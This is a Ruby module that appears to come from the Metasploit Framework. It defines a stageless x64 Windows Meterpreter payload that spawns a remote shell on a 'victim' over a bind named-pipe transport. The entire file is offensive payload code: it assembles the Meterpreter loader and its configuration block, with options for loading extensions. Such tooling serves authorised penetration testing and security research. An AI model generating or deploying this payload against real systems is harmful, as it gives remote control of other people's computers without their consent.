##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 203846

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::MeterpreterLoader_x64
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Meterpreter Shell, Bind Named Pipe Inline (x64)',
        'Description' => 'Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.',
        'Author' => [ 'UserExistsError' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::BindNamedPipe,
        'Session' => Msf::Sessions::Meterpreter_x64_Win
      )
    )

    register_options([
      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
      OptString.new('EXTINIT', [false, 'Initialization strings for extensions'])
    ])
  end

  def generate(opts = {})
    opts[:stageless] = true
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts = {})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch: opts[:uuid].arch,
      exitfunk: datastore['EXITFUNC'],
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid: opts[:uuid],
      transports: [transport_config_bind_named_pipe(opts)],
      extensions: (datastore['EXTENSIONS'] || '').split(','),
      ext_init: datastore['EXTINIT'] || '',
      stageless: true
    }.merge(meterpreter_logging_config(opts))

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end
end
